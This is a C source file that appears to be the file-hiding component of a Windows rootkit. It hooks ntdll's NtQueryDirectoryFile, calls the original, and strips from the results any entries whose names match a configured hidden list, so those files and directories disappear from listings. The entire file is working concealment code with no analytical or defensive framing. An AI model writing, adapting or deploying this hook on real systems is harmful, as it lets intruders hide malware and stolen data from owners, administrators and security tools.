#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"

#include "ntquerydirectoryfile.h"

// Given a directory entry, return the next
// directory entry in the linked list. 

DWORD getDirEntryLenToNext( 
        PVOID FileInformationBuffer,
        FILE_INFORMATION_CLASS FileInfoClass
)
{
        DWORD dwResult=0;
        switch(FileInfoClass)
		{
			case FileDirectoryInformation:
				dwResult=((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                break;
            case FileFullDirectoryInformation:
                dwResult=((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                break;
            case FileIdFullDirectoryInformation:
                dwResult=((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                break;
            case FileBothDirectoryInformation:
                dwResult=((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                break;
            case FileIdBothDirectoryInformation:
                dwResult=((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                break;
            case FileNamesInformation:
                dwResult=((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset;
                break;
        }
        return dwResult;
}

// Given two directory entries, link them together in a list. 
void setDirEntryLenToNext( 
        PVOID FileInformationBuffer,
        FILE_INFORMATION_CLASS FileInfoClass,
        DWORD value
)
{
        switch(FileInfoClass)
		{
			case FileDirectoryInformation:
				((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->NextEntryOffset=value;
                break;
            case FileFullDirectoryInformation:
                ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset=value;
                break;
            case FileIdFullDirectoryInformation:
                ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset=value;
                break;
            case FileBothDirectoryInformation:
                ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset=value;
                break;
            case FileIdBothDirectoryInformation:
                ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->NextEntryOffset=value;
                break;
            case FileNamesInformation:
                ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->NextEntryOffset=value;
                break;
        }
}
        
// Return the filename of the specified directory entry. 
PVOID getDirEntryFileName( 
        PVOID FileInformationBuffer,
        FILE_INFORMATION_CLASS FileInfoClass
)
{
        PVOID pvResult=NULL;
        switch(FileInfoClass)
		{
			case FileDirectoryInformation:
				pvResult=(PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
            case FileFullDirectoryInformation:
                pvResult=(PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
            case FileIdFullDirectoryInformation:
                pvResult=(PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
            case FileBothDirectoryInformation:
                pvResult=(PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
            case FileIdBothDirectoryInformation:
                pvResult=(PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
            case FileNamesInformation:
                pvResult=(PVOID)&((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
                break;
        }
        return pvResult;
}

// Return the length of the filename of the specified directory entry. 
ULONG getDirEntryFileLength(PVOID FileInformationBuffer,FILE_INFORMATION_CLASS FileInfoClass)
{
        ULONG ulResult=0;
        switch(FileInfoClass)
		{
			case FileDirectoryInformation:
				ulResult=(ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileNameLength;
                break;
            case FileFullDirectoryInformation:
                ulResult=(ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                break;
            case FileIdFullDirectoryInformation:
                ulResult=(ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                break;
            case FileBothDirectoryInformation:
				ulResult=(ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
				break;
            case FileIdBothDirectoryInformation:
                ulResult=(ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileNameLength;
                break;
            case FileNamesInformation:
                ulResult=(ULONG)((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileNameLength;
                break;
        }
        return ulResult;
}

// ntdll.NtQueryDirectoryFile
NTSTATUS WINAPI NewNtQueryDirectoryFile(
        HANDLE hFile,
        HANDLE hEvent,
        PIO_APC_ROUTINE IoApcRoutine,
        PVOID IoApcContext,
        PIO_STATUS_BLOCK pIoStatusBlock,
        PVOID FileInformationBuffer,
        ULONG FileInformationBufferLength,
        FILE_INFORMATION_CLASS FileInfoClass,
        BOOLEAN bReturnOnlyOneEntry,
        PUNICODE_STRING PathMask,
        BOOLEAN bRestartQuery
)
{
	NTSTATUS rc;

	// call original function
	rc=OldNtQueryDirectoryFile(
			hFile,
			hEvent,
			IoApcRoutine,
			IoApcContext,
			pIoStatusBlock,
			FileInformationBuffer,
			FileInformationBufferLength,
			FileInfoClass,
			bReturnOnlyOneEntry,
			PathMask,
			bRestartQuery
			);

	 if(NT_SUCCESS(rc) && 
       (FileInfoClass==FileDirectoryInformation||
        FileInfoClass==FileFullDirectoryInformation||
        FileInfoClass==FileIdFullDirectoryInformation||
        FileInfoClass==FileBothDirectoryInformation||
        FileInfoClass==FileIdBothDirectoryInformation||
        FileInfoClass==FileNamesInformation)
     )
	 {
		PVOID p = FileInformationBuffer;
		PVOID pLast = NULL;
		BOOL bLastOne,bFound;
		UNICODE_STRING usName;
		ANSI_STRING asName;
					
		if (bReturnOnlyOneEntry) // if only one entry returned we should give the next if it suppose to be hidden
		{
			usName.Buffer=getDirEntryFileName(FileInformationBuffer,FileInfoClass);
			usName.Length=(USHORT)getDirEntryFileLength(FileInformationBuffer,FileInfoClass);
			RtlUnicodeStringToAnsiString(&asName,&usName,TRUE);
			bFound=config_CheckString(ConfigHiddenFileDir,asName.Buffer,asName.Length);
			RtlFreeAnsiString(&asName);
				
			while (bFound)
			{
				rc=OldNtQueryDirectoryFile(
						hFile,
						hEvent,
						IoApcRoutine,
						IoApcContext,
						pIoStatusBlock,
						FileInformationBuffer,
						FileInformationBufferLength,
						FileInfoClass,
						bReturnOnlyOneEntry,
						PathMask,
						bRestartQuery
						);
                        		
                if (rc!=STATUS_SUCCESS)
                	return(rc);
                       		
                usName.Buffer=getDirEntryFileName(FileInformationBuffer,FileInfoClass);
				usName.Length=(USHORT)getDirEntryFileLength(FileInformationBuffer,FileInfoClass);
				RtlUnicodeStringToAnsiString(&asName,&usName,TRUE);
				bFound=config_CheckString(ConfigHiddenFileDir,asName.Buffer,asName.Length);
				RtlFreeAnsiString(&asName);
			}
		}
        else // if full list hide the ones that should be hidden
		{		
			do 
			{
				bLastOne=!getDirEntryLenToNext(p,FileInfoClass);
				
				// compare directory-name 
				if (getDirEntryFileLength(p,FileInfoClass)) 
				{
					usName.Buffer=getDirEntryFileName(p,FileInfoClass);
					usName.Length=(USHORT)getDirEntryFileLength(p,FileInfoClass);
					RtlUnicodeStringToAnsiString(&asName,&usName,TRUE);
					if (config_CheckString(ConfigHiddenFileDir,asName.Buffer,asName.Length))
					{
                		RtlFreeAnsiString(&asName);
						if(bLastOne) 
						{
							if(p==FileInformationBuffer) rc=0x80000006;
							else setDirEntryLenToNext(pLast,FileInfoClass,0);
							break;
						} 
						else 	
						{	
							int iPos=((ULONG)p)-(ULONG)FileInformationBuffer;
							int iLeft=(DWORD)FileInformationBufferLength-iPos-getDirEntryLenToNext(p,FileInfoClass);
							RtlCopyMemory(p,(PVOID)((char*)p+getDirEntryLenToNext(p,FileInfoClass)),(DWORD)iLeft);
							continue;
						}
					}
					RtlFreeAnsiString(&asName);
				}
			
				pLast = p;
				p=((char*)p+getDirEntryLenToNext(p,FileInfoClass));
			} 
			while(!bLastOne);
		}
	}
     
	return rc;
}
